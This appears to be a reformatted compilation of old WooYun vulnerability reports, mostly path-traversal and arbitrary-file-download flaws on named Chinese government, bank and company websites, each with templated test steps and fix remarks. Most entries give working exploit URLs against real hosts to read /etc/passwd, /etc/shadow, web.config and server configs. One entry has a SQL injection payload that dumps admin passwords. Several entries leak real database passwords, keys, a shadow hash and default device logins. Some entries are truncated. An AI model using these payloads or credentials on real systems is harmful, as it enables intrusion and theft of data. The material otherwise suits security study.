**POC**: 来自XMPP_DB_HOST好多用户呀可以看到用户消息图片

**绕过**: 直接利用

**修复**: elasticsearch 升级改密码吧。。
---

---
### [wooyun-2014-049999] 某省政府任意文件下载可致服务器沦陷
**厂商**: 陕西省政府 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: tomcat配置文件www.ccgp-shaanxi.gov.cn/download?fileName=../../conf/tomcat-users.xmlwww.ccgp-shaanxi.gov.cn/download?fileName=WEB-INF/web.xml服务器信息：www.ccgp-shaanxi.gov.cn/download?fileName=../../../../../../../etc/passwdwww.ccgp-shaanxi.gov.cn/download?fileName=../../../../../../../../etc/sysconfig/network开启服务：www.ccgp-shaanxi.gov.cn/download?fileName=../../../../../../../../etc/servicesweb目录整站可还原：下载所有

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 尽快修复
---

---
### [wooyun-2013-039750] 人民网某系统任意文件读取漏洞
**厂商**: 人民网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 信息泄露http://ids.people.com.cn/ids/admin/debug/env.jsp任意文件读取http://ids.people.com.cn/ids/admin/debug/fv.jsp?f=/../../../../../../../../etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0128679] 华为某接口设计不当导致任意文件下载
**厂商**: 华为技术有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个接口:ErrorInfDownLoad当然不止这一个http://211.137.7.84:8080/ErrorInfDownLoad?errorName=/../../../../../../../etc/passwdhttp://211.137.7.84:8080/ErrorInfDownLoad?errorName=/../../../../was/webroot/WEB-INF/web.xml

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashlp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/bashwwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:

**绕过**: 直接利用

**修复**: .......
---

---
### [wooyun-2013-019748] 新东方某应用任意文件读取！
**厂商**: 新东方 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://zhaopin.xdf.cn/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制用户路径输入！
---

---
### [wooyun-2014-059360] 某通用型cms任意文件下载
**厂商**: 升腾软件 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 响应疯狗号召，案例就该写清楚。出现该漏洞的厂商叫：升腾软件http://www.google.de/#newwindow=1&q=/zlxz/down.aspx先拿一例看看：http://www.lhfgc.gov.cn/zlxz/down.aspx特征/zlxz/down.aspxhttp://www.lhfgc.gov.cn/zlxz/down.aspx?Url=../zlxz/down.aspx.cs下载donw.aspx.cs的源码通过对目录结构的分析，得到web.config在根目录下。因此构造http://www.lhfgc.gov.cn/zlxz/down.aspx?Url=../web.config就可以下载数据库配置数据库名，账户，密码，历历在目

**POC**: 看看其他的一些搜索到的例子：例子2http://www.wlfc.gov.cn/zlxz/down.aspx?Url=../web.config例子3www.khfdc.com/zlxz/down.aspx?Url=../web.config例子4http://122.226.168.166/zlxz/down.aspx?Url=../web.config不一一列举了。。经过对不少案例分析，大多为房产局管理处用的比较多。。希望提供这个有利于cert的分析

**绕过**: 直接利用

**修复**: 关键还是对url参数传入的检测。禁止跨目录即可。
---

---
### [wooyun-2015-098700] 多家银行及行业网站任意文件下载
**厂商**: CNCERT | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:/download/download.jsp?filename=关键字不太准，google没搜到多少下载文件路径：/../WEB-INF/web.xml../../../../../../../../../../windows/win.ini保定银行1、www.bd-bank.com.cn/download/download.jsp?filename=1361956542714.txt&filepath=../../../../../../../../../../windows/win.ini玉溪市商业银行2、http://www.yxccb.com.cn/download/download.jsp?filepath=../../../../../../../../../../windows/win.ini&filename=1363166087810.xml中国印刷行业网3、

**POC**: 曾经提交过类似的：http://wooyun.org/bugs/wooyun-2015-091246

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010892] Guitar pro ios版本目录遍历
**厂商**: Guitar pro | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 很多ios应用都支持在wifi环境下共享文件，比如guitar pro，这是一个强大的乐谱分享和乐谱浏览软件，允许用户在wifi下通过web传输乐谱。在web下有目录遍历漏洞

**POC**: 先打开guitar pro，开启wifi共享访问它完爆

**绕过**: 直接利用

**修复**: 其实我也不懂=、=
---

---
### [wooyun-2013-044130] Skype中文官方网站任意文件下载
**厂商**: gmw.cn | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://skype.gmw.cn/file/d.html?fileName=SkypeSetupFull.6.11.99.102.exefileName没有过滤，导致可以用../跳转目录，下载其他文件。网站还是root权限，可以直接下载/etc/shadow，破解hash

**POC**: http://skype.gmw.cn/file/d.html?fileName=../../../etc/shadow

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-07462] 广东人民发展研究中心网站任意文件下载
**厂商**: 广东省人民政府 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.gdyjzx.gov.cn/downs.action;jsessionid=6C73378817AF8A716291053618724467?fileName=5bd49251-1603-40fd-9ce6-8e32a769dabf.doc&filePath=E:%5CTomcat6BackRun%5Cwebapps%5CROOT%5Cinformation/其中文件下载路径参数filepath没有对路径进行必要的限制！另：下载路径直接暴漏了网站的物理路径！

**POC**: http://www.gdyjzx.gov.cn/downs.action;jsessionid=6C73378817AF8A716291053618724467?fileName=tomcat-users.xml&filePath=E:%5CTomcat6BackRun%5Cconf\http://www.gdyjzx.gov.cn/downs.action;jsessionid=6C73378817AF8A716291053618724467?fileName=boot.ini&filePath=c:%5C

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-0157555] 飞牛网某分站存在任意文件下载漏洞
**厂商**: 飞牛网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://fnonline.feiniu.com/live800/downlog.jsp?filepath=/&file=etc/passwd

**POC**: http://fnonline.feiniu.com/live800/downlog.jsp?filepath=/&file=etc/passwd

**绕过**: 直接利用

**修复**: 限定访问
---

---
### [wooyun-2014-062555] 从一个二维码到雅座全线数据
**厂商**: 雅座 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关注以后在微信里的会员页面如下没有检测ua 在pc的浏览器上也可以打开商家logo那里有任意文件读取先收集信息备用http://58.83.233.44/yazuo-weixin/weixin/phonePage/getImage.do?brandId=1119&name=../../../../../../etc/passwdeth0# Xen Virtual EthernetDEVICE=eth0BOOTPROTO=noneONBOOT=yesHWADDR=2e:97:34:fd:02:b0NETMASK=255.255.255.0IPADDR=192.168.50.60GATEWAY=192.168.50.254TYPE=Ethernethosts# Do not remove the following line, or various programs# that require

**POC**: 先说比较重要的问题主站是dedecms的 存在注入http://www.yazuo.com/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]

**绕过**: 直接利用

**修复**: 提醒一句 crm大部分用户的密码都是某个弱口令 这样不太好
---

---
### [wooyun-2015-0150611] 浙江大华某某系统任意文件下载、弱口令（涉及大量监控设备）
**厂商**: 浙江大华技术股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:8088平安城市DSS平台

**POC**: 漏洞一：弱口令system，123456泄露大量用户信息，警员信息，配置信息等敏感信息漏洞二：某接口可任意读取文件/itc/attachment_downloadByUrlAtt.action?filePath=file://hosts文件证明是大华的读取web配置文件漏洞三：未授权访问，上传文件未登录访问**.**.**.**:8088/emap/gis/page/bitmap/config_bitmap.jsp一开始没有图片不用登录情况下，上传文件大量敏感功能漏洞四：监控外泄利用大华通用的DSS客户端用system，123456登录

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2013-046686] 哈报集团旗下 399社区 某服务配置失误 泄露用户数据
**厂商**: 哈报集团旗下399社区 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.my399.com/config/config_ucenter.php.bak###直接读取到论坛的UCENTER配置文件<?php<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', '192.168.1.108');define('UC_DBUSER', 'root');define('UC_DBPW', 'comsenzvip2010');define('UC_DBNAME', 'ultrax');define('UC_DBCHARSET', 'gbk');define('UC_DBTABLEPRE', '`ultrax`.cdb_uc_');define('UC_DBCONNECT', '0');define('UC_KEY', 'df13xlK+KUq1XHqGdo09ssBk+d3LFI3wg8b0N

**POC**: ###直接读取到论坛的UCENTER配置文件<?php<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', '192.168.1.108');define('UC_DBUSER', 'root');define('UC_DBPW', 'comsenzvip2010');define('UC_DBNAME', 'ultrax');define('UC_DBCHARSET', 'gbk');define('UC_DBTABLEPRE', '`ultrax`.cdb_uc_');define('UC_DBCONNECT', '0');defin

**绕过**: 直接利用

**修复**: #1 网络边界需要认真对待。#2 杜绝为了方便而造成的不必要的信息泄露。#3 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。
---

---
### [wooyun-2015-0164486] 华泰人寿某系统存在任意文件读取漏洞
**厂商**: 华泰人寿保险股份有限公司 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://114.251.203.84/ui//f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwdhttp://114.251.203.84/ui//f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts

**POC**: http://114.251.203.84/ui//f1print/F1PrintKernelJ1.jsp?&RealPath=/home/weblogic/.bash_history

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0122336] dtcms最新版任意文件删除漏洞(补丁修复不给力绕过继续删除)
**厂商**: dtcms.net | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 同样的是tools/upload_ajax.ashx:private void UpLoadFile(HttpContext context){DTcms.Model.siteconfig siteConfig = new DTcms.BLL.siteconfig().loadConfig();string _delfile = DTRequest.GetString("DelFilePath");HttpPostedFile _upfile = context.Request.Files["Filedata"];bool _iswater = false;bool _isthumbnail = false;if (DTRequest.GetQueryString("IsWater") == "1"){_iswater = true;}if (DTRequest.GetQueryStrin

**POC**: 这里我们同样是demo演示:这个是第一次上传这里是删除了同样的我们把DelFilePath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/../web.config传过去，网站配置文件就删掉了!

**绕过**: 过滤绕过

**修复**: 补丁的补丁
---

---
### [wooyun-2012-013259] 百合网二级域名分站服务器目录遍历及源码暴露
**厂商**: 百合网 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mfc.baihe.comhttp://mfc.baihe.com/ddedu/download/software/http://mfc.baihe.com/ddedu/usereg/ddedu_user_reg2.jsp.naihttp://mfc.baihe.com/serviceshttp://mfc.baihe.com:2100/以及该网站所有目录，均可以遍历，其中包括大量文件和重要信息，部分备份的服务端脚本文件可直接下载，泄露源代码可通过信息获知服务器相关配置类型，并且服务器开放了重要知名端口，相关默认服务未更改，可为为进一步渗透入侵做准备。

**POC**: http://mfc.baihe.comhttp://mfc.baihe.com/ddedu/download/software/http://mfc.baihe.com/ddedu/usereg/ddedu_user_reg2.jsp.naihttp://mfc.baihe.com/serviceshttp://mfc.baihe.com:2100/

**绕过**: 直接利用

**修复**: 相关网络管理员应该及时正确配置服务器相关设置，以解决信息泄漏问题。
---

---
### [wooyun-2011-03150] 华夏银行信用卡分站存在任意文件下载（读取）漏洞
**厂商**: 华夏银行 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://creditservice.hxb.com.cn/nantiankb/admin/article/article/DownloadTFile.do?file=vfltg3jxvkb2(1).html首先服务器没有做任何安全设置，其次，jsp的权限直接是root，再者file没有对路径进行限制

**POC**: http://creditservice.hxb.com.cn/nantiankb/admin/article/article/DownloadTFile.do?file=../../../../../../../etc/passwd同理shadow也可以下载root:$1$O2mSJ/.3$CZ1cgjn/eQAFd5BwKwhfI.:15047:0:99999:7:::。。。。。。。。。

**绕过**: 直接利用

**修复**: 不懂jsp
---

---
### [wooyun-2015-091194] 上海电信在线客服系统任意文件下载漏洞
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海电信在线客服系统使用用友ICC客服系统，存在任意文件下载漏洞，可导致敏感信息泄露

**POC**: <code>上海电信在线客服系统使用用友ICC客服系统，存在任意文件下载漏洞，可导致敏感信息泄露http://help.sh.189.cn/web/icc/chat/chat?c=1&s=1系统密码文件泄露：http://help.sh.189.cn/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\shadow</code>

**绕过**: 直接利用

**修复**: 限制文件路径
---

---
### [wooyun-2011-02221] 安全组织80sec目录遍历
**厂商**: 80SEC | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关闭该目录的浏览权限
---

---
### [wooyun-2014-066512] 用友某系统任意文件读取
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://hr.minshengec.cn/hrss/login.jsp 地址查看源代码http://wenku.baidu.com/view/252b4448e518964bcf847ccb?fr=prin 百度到了配置文件然后慢慢构造https://hr.minshengec.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml读取到了数据库还有一个敏感信息泄露https://hr.minshengec.cn/login.jsp查看源代码

**POC**: http://ehr.jmlyp.com/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmlhttp://hr.nanfu.com/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmlhttp://hr.springgroup.cn/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xmlhttp://60.13.183.174/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml等等等等。。。。。

**绕过**: 直接利用

**修复**: 怎么修复呢？
---

---
### [wooyun-2015-0165783] 魅族科技多站漏洞任意文件下载可读shadow&solr系统未授权访问
**厂商**: 魅族科技 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：http://sync.meizu.com:80/download/etc/passwdhttp://sync.meizu.com:80/download/etc/shadowmask 区域*****qQlrTDd/GmQ0:1**********:0:999**********8:0:999**********:0:999**********0:9999**********8:0:99**********628:0:9**********8:0:99**********8:0:99**********8:0:99**********628:0:9**********:0:9999**********8:0:999**********:0:999**********8:0:999**********6452:**********2:0:99**********6452:*****

**POC**: solr 未授权访问：1. http://116.31.71.7:8080/solr/#/2. http://116.31.71.8:8080/solr/#/~logging3. http://116.31.71.9:8080/solr/#/~java-properties

**绕过**: 直接利用

**修复**: 话说我大煤油可以求礼物不～～
---

---
### [wooyun-2012-07034] 国务院国资委协会网任意文件下载
**厂商**: 国务院国资委 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.sasaca.gov.cn/download?filename=2011-06-103288537.pdf&filepath=E:\Tomcat 5.0\webapps\ROOT\attachment\wjsc\其中文件下载路径参数filepath没有对路径进行必要的限制！另：下载路径直接暴漏了网站的物理路径！

**POC**: http://www.sasaca.gov.cn/download?filename=server.xml&filepath=E:\Tomcat%205.0\conf\http://www.sasaca.gov.cn/download?filename=index.jsp&filepath=E:\Tomcat%205.0\webapps\ROOT\.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2013-035283] 某某工商管理局任意文件读取漏洞（root权限可读shadow密码散列）
**厂商**: 北京市工商管理局 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试代码：http://211.94.187.231/dcdy/download?path=../../../../../../../../../../etc/passwdhttp://211.94.187.231/dcdy/download?path=../../../../../../../../../../etc/shadow

**POC**: 谁手输入个test,提示文件不在服务器上，说明只要是服务器上的文件都可以下载。

**绕过**: 直接利用

**修复**: 。。。。
---

---
### [wooyun-2012-013895] 唯品会(Vipshop) 目录遍历 文件包含
**厂商**: 唯品会 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里目录遍历 etc/passwd还可以包含？任意文件下载 比如web.config

**POC**: 目录遍历 etc/passwdhttp://jf.vipshop.com/jfhoutaiadmin/index.php?a=login&m=../../../../../../../../../../etc/passwd%00这里是包含？好像做了限制！不确定。http://jf.vipshop.com/jfhoutaiadmin/index.php?a=login&m=../../robots.txt%00.php下载文件http://jf.vipshop.com/web.config

**绕过**: 直接利用

**修复**: .....
---

---
### [wooyun-2014-084804] 圆通某业务线某邮件服务器任意文件读取
**厂商**: 圆通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.yto56.com.cn/Zimbra邮件系统文件包含漏洞(http://sebug.net/vuldb/ssvid-61096)http://mail.yto56.com.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00

**POC**: a.root="x:0:0:root:/root:/bin/bash";a.bin="x:1:1:bin:/bin:/sbin/nologin";a.daemon="x:2:2:daemon:/sbin:/sbin/nologin";a.adm="x:3:4:adm:/var/adm:/sbin/nologin";a.lp="x:4:7:lp:/var/spool/lpd:/sbin/nologin";a.sync="x:5:0:sync:/sbin:/bin/sync";a.shutdown="x:6:0:shutdown:/sbin:/sbin/shutdown";a.halt="x:7:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0154250] 广汽丰田几个系统漏洞打包（3477条用户近期购车咨询对话记录泄漏）
**厂商**: 广汽丰田 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1#任意文件下载http://**.**.**.**:8099//live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwdhttp://**.**.**.**:8099//live/down.jsp?file=../../../../../../../../../../../../../../../../etc/hosts

**POC**: 2#客服系统未授权访问（3477条用户近期购车咨询对话记录泄漏）http://**.**.**.**:8080/gdgl/PageUI102.service?TNTID=admin

**绕过**: 直接利用

**修复**: 授权访问，过滤../
---

---
### [wooyun-2014-081269] 国家公务员某信息平台存在任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家公务员考录信息平台http://kls.scs.gov.cn/klspt/downloadfile.jsp?file=/klspt/downloadfile.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制跨目录下载
---

---
### [wooyun-2015-0147977] 华英证券协同管理平台任意文件下载漏洞和MS12-020漏洞
**厂商**: 华英证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/defaultroot/desktop.jsp协同管理平台，登录后，下载文件链接如下/defaultroot/download.jsp?FileName=xxx&name=xxx.pdf&path=information将FileName改为文件路径即可，如下

**POC**: 附赠ms12-020漏洞

**绕过**: 直接利用

**修复**: 修复及升级补丁
---

---
### [wooyun-2013-024761] 当当网音乐频道本地文件读取漏洞
**厂商**: 当当网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://music.dangdang.com/project/music/hosts/ajax_proxy.php漏洞测试：POST /project/music/hosts/ajax_proxy.php HTTP/1.1Referer: http://music.dangdang.com:80/Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestAccept: text/html, */*Content-Length: 128User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)Pragma: no-cacheHost: music.dangdang.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 漏洞修复这一栏可以加一个选择功能，同样类型的漏洞就不要每次都写修复方法了。本来想直接发给当当的，但是没找到发送方式，就发乌云来了。
---

---
### [wooyun-2016-0173543] 广州农商银行运维不当多处敏感信息泄露（多个运维安全隐患集合）
**厂商**: 广州农商银行 | **年份**: 2016 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先用自己的字典扫描到WEB-INF/web.xml泄露地址：http://**.**.**.**/TopMall/WEB-INF/web.xml以及.viminfo泄露地址：http://**.**.**.**/.viminfo进而看到httpd、nginx.conf配置泄露：地址：http://**.**.**.**/nginx154/conf/nginx.confhttp://**.**.**.**/apache/conf/httpd.conf到这里突然意识到这里存在任意文件读取问题，只需要猜测到文件路径，便可以直接下载。接着发现存在.bash_history地址：http://**.**.**.**/.bash_history看到了网站路径，用户名、用户组以及发现日志路径：接着我毫不犹豫的准备下载access.log，可是看到下载时间的一瞬间我哭了：下载地址：http://**.*

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除所有的敏感信息页面。
---

---
### [wooyun-2015-093466] 庆市人力资源和社会保障局任意文件下载
**厂商**: 大庆市人力资源和社会保障局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点域名：www.daqinghr.gov.cn大庆市人力资源和社会保障局发现一处任意文件下载，可下载/etc/passwd文件：http://www.daqinghr.gov.cn/fileDownload.jsp?fileName=/../../../../../etc/passwd下载/etc/shadow文件：http://www.daqinghr.gov.cn/fileDownload.jsp?fileName=/../../../../../etc/shadow另外，该服务器还对外开放了22端口，OpenSSH_4.3，恶意攻击者通过破解shadow文件后，便可直接ssh登录完全控制该服务器，建议及时处理。

**POC**: 发现一处任意文件下载，存在问题的点：下载/etc/passwd文件：http://www.daqinghr.gov.cn/fileDownload.jsp?fileName=/../../../../../etc/passwd如下图：用记事本查看其内容：下载/etc/shadow文件：http://www.daqinghr.gov.cn/fileDownload.jsp?fileName=/../../../../../etc/shadow看下图：对其内容进行了整理，以方便看到3个系统帐号：说明网站当前运行权限是root权限，如此便可下载操作系统上的任意文件。并从中得知操作系统类型是cento

**绕过**: 直接利用

**修复**: 建议开发人员对fileDownload功能对应的代码进行审核，对客户端提交的文件名进行安全检查及过滤。1）对fileName的取值范围进行严格限制，比如只允许访问特定的目录，其他目录都禁止访问，从权限上严格控制；2）对文件名进行硬编码，将文件名转换成固定长度的字符串序列，并采用白名单方式对文件名后缀
---

---
### [wooyun-2015-0147405] 奥蓝学生管理系统弱密码与任意文件下载
**厂商**: 南京奥蓝科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用南理工作为测试http://**.**.**.**/密码默认为空，奥蓝的设计理念难道是没有密码就是最强的密码？暴破一下用户，得到用户名lzy 密码空 登上去，数据量大大的登录后，aldfdnd.aspx这里可以跨路径，下载任意文件构造一下http://**.**.**.**/aldfdnd.aspx?file=../global.asax就可下载web根目录下的global.asax文件了，内含数据库配置信息Application("yxmc")="南京理工大学"application("sqlserver_s")="server=localhost;database=xsc_sys;uid=xscnet;PWD=xs****35@1202;Enlist=false"application("sqlserver_w")="server=localhost;database=xsc_wor

